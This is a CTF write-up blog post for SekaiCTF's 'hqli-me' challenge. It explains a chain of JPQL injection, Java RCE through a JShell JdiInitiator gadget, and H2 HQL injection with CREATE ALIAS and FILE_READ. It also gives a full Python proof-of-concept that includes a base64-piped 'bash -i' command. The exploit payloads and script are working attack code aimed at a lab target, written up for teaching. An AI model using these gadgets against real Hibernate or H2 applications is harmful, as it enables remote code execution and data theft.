---
title: "SekaiCTF Writeups (Part 2)"
date: 2025-11-17
excerpt: "One of the hardest CTF competitions I have ever participated in. I hope to update the write-ups for the remaining challenges at the earliest possible time."
tags:
  - sekaiCTF
  - HQL injection
  - RCE
  - JPQL injection
  - JShell
---
# hqli-me

## Challenge description
❖ Note: Please note that this challenge has no outgoing network access.

## Exploitation

### 1. Challenge Analysis

The challenge consists of two Java microservices running on host network:

`authn_service`

+ HTTP on port 8000, using H2 in-memory (embedded in JVM).

+ Contains execute-only binary /flag.

`order_service`

+ HTTP on port 1337, using MySQL (root / password) on 127.0.0.1:3306.

+ This is the only service exposed externally (according to compose.yaml).

The goal is to read the flag in the `authn_service.Remote` container which has no outbound network.

`compose.yaml:`

+ `mysql`, `authn_service`, `order_service` all have `network_mode: host` → sharing network with host.

+ Only `order_service` is annotated "This service will be exposed" → only port **1337** is accessible, while **8000** is used internally between services on host.

+ MySQL: `jdbc:mysql://127.0.0.1:3306/db`, user `root`, pass `password`.

+ `authn_service` runs with **root** privileges, builds `/flag` from `flag.s` and `chmod 1 /flag` (execute-only).

+ `order_service` runs under user **nobody**.

→ The only way in from outside: HTTP `:1337` → `order_service`.

→ All interactions with H2 / `/flag` must go through `order_service`.

#### authn_service (H2)

Has 2 main responsibilities

1. Manage users and passwords (`users` table).

2. Manage sessions (`sessions` table).

- `/login`: dựng HQL bằng string format:  

  ```python
  case "/login" -> {
    var sql = "select u from User u where u.username = \"%s\" and u.password = \"%s\"".formatted(
        formData.get("username"),
        formData.get("password")
  );
  ```  
  -> SQL/HQL injection thẳng vào username/password. User password được MD5 ở `@PrePersist`.
- `/sessionInfo`: HQL string format với `sessionId`:  
  `select s from Session s where s.sessionId = "%s"`  
  -> HQL injection vào sessionId. Trả về `user=<username>` nếu có session hợp lệ.
- `Session.sessionId` sinh ngẫu nhiên nếu null; `addSession` lưu session (User, sessionId).
- H2 allows arbitrary functions (`FILE_READ`, `CSVWRITE`, `RAWTOHEX`, etc.).

If we can send arbitrary input to `/login` or `/sessionInfo`, we have HQL injection on H2 → combined with H2's powerful functions (CSVWRITE, FILE_READ, RAWTOHEX, CREATE ALIAS, …) to achieve RCE or arbitrary file read on `authn_service`.

But we cannot call directly to `8000`; all requests must go through `order_service`

#### order_service (MySQL)

Has 2 main responsibilities

1. Proxy login to `authn_service`.

2. Provide endpoint `/orders` with **JPQL injection**.


`UserAuthenticationClient`
```js
if (!u.matches("^[a-zA-Z0-9]+$")) throw ...
var postData = "username=" + u + "&password=" + Util.md5(p);
```

+ `username` only allows `[A-Za-z0-9]` → cannot inject characters like `', ", space, ;, …`

+ `password` is hashed with MD5 before sending → only hex string `[0-9a-f]` remains.

→ When logging in through `order_service`, data reaching `/login` of `authn_service` has been sanitized:

+ Username alphanumeric.

+ Password is hex hash, not arbitrary payload.

Therefore, cannot directly exploit HQL injection at `/login` (even though code in `authn_service` is still vulnerable).

`getSession(sessionId)`

```js
if (!sessionId.matches("^[0-9a-fA-F]+$")) throw ...
var postData = "sessionId=" + sessionId;
```

+ `sessionId` is forced to be hex.

+ Cannot inject `" or 1=1 --` or other HQL expressions.

→ HQL injection at `/sessionInfo` is also not reachable. It only becomes useful if RCE is already achieved on the host (e.g., code running from `order_service` sends internal HTTP to 8000).

**Endpoint `/login`**

+ Receives `username`, `password` from client.

+ Calls `UserAuthenticationClient.login`.

+ If successful → returns `sessionId` (hex string).

This is a required step to get a valid sessionId for use with `/orders`.


**Endpoint `/orders` – JPQL injection**

Flow:

1. Receives `sessionId` and `fields` from client.

2. Calls `getSession(sessionId)`:

If `sessionId` is valid → receives `authnUser` (username from H2).

If not → HTTP 401.

3. Checks `fields` using `Util.validateFields`.
4. Build query:

```js
var sql = "select %s from Order o where o.username=\"%s\""
          .formatted(fields, authnUser);
```

**Hàm `validateFields`**

```js
public static boolean validateFields(String fields) {
    var tokens = fields.split(",");
    for (var token : tokens) {
        token = token.trim();
        if (Pattern.matches("\\W", token)) {
            return false;
        }
    }
    return true;
}
```

+ `fields` is split by commas into tokens.

+ `Pattern.matches("\\W", token)` only returns `true` if token is exactly 1 non-word character, e.g., "+", "*", "@", "(", …).

+ If token is a long string (`"new jdk.jshell.execution.JdiInitiator(...)", `"o.username"`, `"id"`, …) → does NOT match \W → accepted.

⇒ Filter is nearly useless. We can send `fields` as a complete JPQL expression, for example:

`new jdk.jshell.execution.JdiInitiator(...)`

Hibernate will:

+ Execute query `select new jdk.jshell.execution.JdiInitiator(...) from Order o where ....`

+ Call constructor `JdiInitiator(...)` directly in the JVM of `order_service`.

This is the JPQL injection point used to achieve RCE on `order_service`.

### 2. Main Vulnerabilities

* **JPQL injection at `order_service:/orders`**
  * Due to incorrect `\W` filter, allows passing an entire constructor expression like  
    `new jdk.jshell.execution.JdiInitiator(...)`.
  * This is the **only remote entry point** to execute Java code in the JVM of `order_service`.

* **HQL injection at `authn_service:/login` and `/sessionInfo`**
  * Code builds query using plain string, no escaping.
  * Requests go through `UserAuthenticationClient`, so input is forced to **alnum** (`[a-zA-Z0-9]`) or **hex** (`[0-9a-fA-F]`) → **cannot be exploited directly** from client side.
  * After achieving RCE on `order_service`, we use bash/HTTP code internally to send malicious payload directly to port 8000, exploiting these injections on H2.

* **H2 supports powerful functions (`CSVWRITE`, `FILE_READ`, `RAWTOHEX`, `CREATE ALIAS`, …)**
  * Allows:
    * Reading files: `RAWTOHEX(FILE_READ('/flag'))`.
    * Defining alias to call arbitrary Java code: `CREATE ALIAS ... AS '...java code...'`.
  * In final stage, use SQL injection on H2 to:
    * Create user/session with `username = flag` or `username = RAWTOHEX(flag)`.
    * Then read flag back via `/orders` (by using fake session and selecting field `username`).

### 3. Exploitation Approach
#### Step 1 – Obtain valid session from remote

Send:

```http
POST /login
Content-Type: application/x-www-form-urlencoded

username=guest&password=guest
```

to `order_service`:

- `order_service` hashes `password` → sends to `authn_service:/login`.
- `authn_service` finds user `"guest"` with corresponding MD5 password.
- If ok → creates new session, returns `"sessionId=<hex>"`.
- `order_service` forwards back to client.

We need a valid `sessionId` to call `/orders`. This is a normal login step.

---

#### Step 2 – RCE on `order_service` via JPQL injection

Exploit the `fields` parameter of `/orders`.

##### 2.1. Create JShell payload

Use `fields` = `new jdk.jshell.execution.JdiInitiator(...) union select ...`.

`JdiInitiator` is configured to:

- Run `jdk/tools/jlink/internal/Main` with parameter: `--save-opts /tmp/lol`

- Pass in 1 map containing hidden command:

```text
jdk/tools/jlink/internal/Main --output /tmp/ab --add-modules java.base   -p "\n<java_code>" --save-opts /tmp/lol
```

`<java_code>` is the Java string we encode from a bash command:

```java
Runtime.getRuntime().exec(new String(new byte[]{ ... }));
```

This bash command will:

```bash
wget --header='Content-Type: application/x-www-form-urlencoded'      --post-data "username=u&password=<H2_CSVWRITE_PAYLOAD>"      http://127.0.0.1:8000/login
```

- In stage 1, we use JPQL injection to push Java code into config file `/tmp/lol` that JShell will use later.
- The bash command is actually an internal HTTP request:
  - Tells `authn_service:/login` to run H2 SQL with `CSVWRITE + CREATE ALIAS` to create session containing flag.

##### 2.2. Execute JShell script

Call `/orders` a second time with `fields` = another `JdiInitiator` to run:

```text
jdk/internal/jshell/tool/JShellToolProvider /tmp/lol
```

#### Step 3 – Abuse H2 to write flag into fake session

Payload sent to `/login` of `authn_service` (through `wget`) contains:

- An injection into `password`, like:

```sql
\" and function('CSVWRITE','/tmp/kek','<payload_sql>','charset=UTF-8')=\"
```

- `<payload_sql>` depending on mode:

**Mode `exec`:**

```sql
select 1;
CREATE ALIAS SHELLEXEC AS ''
  void leak(String sessId, String cmd) throws java.lang.Exception {
    sekai.HibernateUtil.addSession(
      new sekai.Session(
        sekai.HibernateUtil.addUser(
          new sekai.User(
            new java.lang.String(
              new java.lang.ProcessBuilder(cmd)
                .start()
                .getInputStream()
                .readAllBytes()
            ).concat(new java.lang.String(new byte[]{39,124,124,34})),
            cmd
          )
        ),
        sessId
      )
    );
  }
'';
CALL SHELLEXEC('<LEAK_SESS>', '<CMD>');
```

- `CMD` is usually `/flag`.
- `ProcessBuilder(cmd)` runs `/flag`, gets stdout.
- Creates user with `username = <stdout> + "'||"` (for easy concat).
- Attaches user to session with `sessionId = LEAK_SESS`.

**Mode `hexread`:**

```sql
select 1;
CREATE ALIAS LEAK AS ''
  void leak(String sessId, String data) throws java.lang.Exception {
    sekai.HibernateUtil.addSession(
      new sekai.Session(
        sekai.HibernateUtil.addUser(
          new sekai.User(data, data)
        ),
        sessId
      )
    );
  }
'';
CALL LEAK('<LEAK_SESS>', RAWTOHEX(FILE_READ('/flag')));
```

- `FILE_READ('/flag')` reads content of file `/flag`.
- `RAWTOHEX(...)` encodes content to hex string.
- Saves hex(flag) to `username` of user attached to session `LEAK_SESS`.

-> Tells H2 to create a new user, with `username` containing **flag or hex(flag)**.
-> Attaches that user to fake session with id = `LEAK_SESS` (chosen by us).
-> After this step, in `authn_service` DB there exists a valid session:

```text
sessionId = LEAK_SESS
user.username = flag or RAWTOHEX(flag)
```

---

#### Step 4 – Read flag via `/orders` with fake session

Call `/orders` again from remote:

1. Send `sessionId = LEAK_SESS` (chosen from the beginning, matching the H2 session just created).
2. `order_service` calls `getSession(LEAK_SESS)`:
   - From its perspective, this is just a valid session.
   - It receives `authnUser = <username containing flag>` from H2.
3. Query MySQL:
   - With **mode `exec`**:
     - `fields = "1||'"` → forces Hibernate/TSQL to return a string containing username/flag.
   - With **mode `hexread`**:
     - `fields = "username"` → reads hex string, client does `bytes.fromhex().decode()`.

4. Client parses response, finds substring `"SEKAI{...}"` and prints it.


---

**Result:**  
From a single HTTP port (`/orders` on port 1337), chain:

1. **JPQL injection** → Java RCE on `order_service`.
2. **HQL injection + H2 gadget** → write flag into fake session in `authn_service`.
3. **Call `/orders` again with fake sessionId** → read flag back to client.


### 4. PoC

**Notes:**

- Host network: run PoC from container `--network host` to access 127.0.0.1:1337/8000 (Docker Desktop).

- Clean H2: session/username with syntax error may cause 500; reset stack (`docker compose down -v`) if needed.

- `order_service/login` returns `sessionId=<hex>` → need to extract part after `=` before using.

- Choose random `LEAK_SESS` to avoid colliding with old sessions.

- `compose.yaml` uses `network_mode: host`. "Host" here is the Linux VM that Docker Desktop uses, not Windows or WSL on your machine.

- When trying curl 127.0.0.1 (line 1337)` from PowerShell/WSL, you're still outside that VM so you won't see the port → reports "connection refused".

- Need to run PoC "inside" the same Docker host network (container `--network host`, or WSL if Docker daemon runs in WSL) to see 127.0.0.1:1337/8000.

To run PoC for WSL:

```bash
cd /mnt/<path_to_your_compose.yaml>
docker run --rm -it --network host -v "$PWD":/work python:3.11-slim bash
cd /work
pip install requests
ATTACK_MODE=exec ORDER_URL=http://127.0.0.1:1337 python your_file_exploit.py
```

```python
import base64
import os
import sys
import secrets

import requests


ORDER_URL = os.environ.get("ORDER_URL", "http://127.0.0.1:1337")
LEAK_SESS = os.environ.get("LEAK_SESS") or secrets.token_hex(16)
CMD = os.environ.get("CMD", "/flag")
ATTACK_MODE = os.environ.get("ATTACK_MODE", "hexread").lower()

sess = requests.Session()


def log(msg: str) -> None:
    print(msg, file=sys.stderr)


def order_login() -> str:
    r = sess.post(f"{ORDER_URL}/login", data={"username": "guest", "password": "guest"}, timeout=10)
    if r.status_code != 200:
        raise RuntimeError(f"/login failed: {r.status_code} {r.text}")
    raw = r.text.strip()
    sid = raw.split("=", 1)[1] if "sessionId=" in raw else raw
    log(f"[+] order_service login OK, sessionId={sid}")
    return sid


def order(session_id: str, fields: str) -> requests.Response:
    return sess.post(
        f"{ORDER_URL}/orders",
        data={"sessionId": session_id, "fields": fields},
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=20,
    )


def build_authn_payload(leak_sess: str, cmd: str) -> str:
    if ATTACK_MODE == "hexread":
        payload_sql = (
            "select 1;"
            "CREATE ALIAS LEAK AS ''void leak(String sessId, String data) throws java.lang.Exception {"
            "  sekai.HibernateUtil.addSession(new sekai.Session("
            "    sekai.HibernateUtil.addUser(new sekai.User(data, data)), sessId));"
            "}'';"
            "CALL LEAK(''%s'', RAWTOHEX(FILE_READ(''/flag'')) );"
        ) % leak_sess
    else:
        payload_sql = (
            "select 1;"
            "CREATE ALIAS SHELLEXEC AS ''void leak(String sessId, String cmd) throws java.lang.Exception {"
            "  sekai.HibernateUtil.addSession(new sekai.Session("
            "    sekai.HibernateUtil.addUser(new sekai.User("
            "      new java.lang.String(new java.lang.ProcessBuilder(cmd).start().getInputStream().readAllBytes())"
            "      .concat(new java.lang.String(new byte[]{39,124,124,34})), cmd)), sessId));"
            "}//'';"
            "CALL SHELLEXEC(''%s'', ''%s'');"
        ) % (leak_sess, cmd)

    return (
        '\\" and function(\'CSVWRITE\',\'/tmp/kek\',\'%s\',\'charset=UTF-8\')=\\"'
        % payload_sql
    )


def build_bash_to_authn(leak_sess: str, cmd: str) -> str:
    p = build_authn_payload(leak_sess, cmd)
    inner = (
        f"wget --header='Content-Type: application/x-www-form-urlencoded' "
        f"--post-data \"username=u&password={p}\" http://127.0.0.1:8000/login"
    )
    b64 = base64.b64encode(inner.encode()).decode()
    return f"/bin/bash -c {{echo,{b64}}}|{{base64,-d}}|{{bash,-i}}"


def build_java_exec(code: str) -> str:
    chunks = [code[i : i + 60] for i in range(0, len(code), 60)]
    constr_bytes = "/**/,".join(",".join(str(ord(c)) for c in ch) for ch in chunks)
    return f"Runtime.getRuntime().exec(new String(new byte[]{{{constr_bytes}}}));"


def build_jdi_payload(java_code: str) -> str:
    col = (
        'new jdk.jshell.execution.JdiInitiator('
        '0, new java.util.ArrayList(0), '
        '"jdk/tools/jlink/internal/Main --save-opts /tmp/lol", '
        'true, "localhost", 3000000, '
        'new map('
        f'"jdk/tools/jlink/internal/Main --output /tmp/ab --add-modules java.base -p \\"\\n{java_code}\\" --save-opts /tmp/lol" as main, '
        '"n,server=y,suspend=n,address=localhost:13370" as includevirtualthreads'
        ')'
        ')'
    )
    return f"{col} union select {col} "


def build_jdi_runner() -> str:
    col = (
        'new jdk.jshell.execution.JdiInitiator('
        '0, new java.util.ArrayList(0), '
        '"jdk/internal/jshell/tool/JShellToolProvider /tmp/lol", '
        'true, "localhost", 3000000, '
        'new map("n,server=y,suspend=n,address=localhost:13370" as includevirtualthreads)'
        ')'
    )
    return f"{col} union select {col} "


def main() -> None:
    log(f"[*] Target order_service: {ORDER_URL}")
    log(f"[*] Leak sessionId: {LEAK_SESS} | cmd: {CMD} | mode: {ATTACK_MODE}")

    sid = order_login()

    bash_line = build_bash_to_authn(LEAK_SESS, CMD)
    java_code = build_java_exec(bash_line)
    fields_stage1 = build_jdi_payload(java_code)
    fields_stage2 = build_jdi_runner()

    log("[*] Triggering JdiInitiator stage 1 (plant JShell payload)...")
    r1 = order(session_id=sid, fields=fields_stage1)
    log(f"    response {r1.status_code}: {r1.text[:200]!r}")

    log("[*] Triggering JdiInitiator stage 2 (execute payload)...")
    r2 = order(session_id=sid, fields=fields_stage2)
    log(f"    response {r2.status_code}: {r2.text[:200]!r}")

    log("[*] Fetching leaked flag via forged session...")
    fetch_fields = "1||'" if ATTACK_MODE == "exec" else "username"
    r3 = order(session_id=LEAK_SESS, fields=fetch_fields)
    log(f"    response {r3.status_code}: {r3.text[:200]!r}")
    if r3.status_code == 200 and "SEKAI{" in r3.text:
        start = r3.text.find("SEKAI{")
        end = r3.text.find("}", start)
        if end != -1:
            flag = r3.text[start : end + 1]
            print(flag)
            log(f"[+] FLAG: {flag}")
            return
    elif r3.status_code == 200 and ATTACK_MODE == "hexread":
        text = r3.text.strip("[] \n\r")
        hex_blob = text.strip("[]")
        try:
            decoded = bytes.fromhex(hex_blob).decode("utf-8", "ignore")
            if "SEKAI{" in decoded and "}" in decoded:
                flag = decoded[
                    decoded.index("SEKAI{") : decoded.index("}", decoded.index("SEKAI{")) + 1
                ]
                print(flag)
                log(f"[+] FLAG: {flag}")
                return
            log(f"[?] Decoded hex: {decoded!r}")
        except Exception:
            log(f"[?] Raw username: {text}")

    log("[!] Flag not recovered; inspect responses manually.")


if __name__ == "__main__":
    main()
```

![alt text](/images/posts/SekaiCTF/hqli-me/image.png)
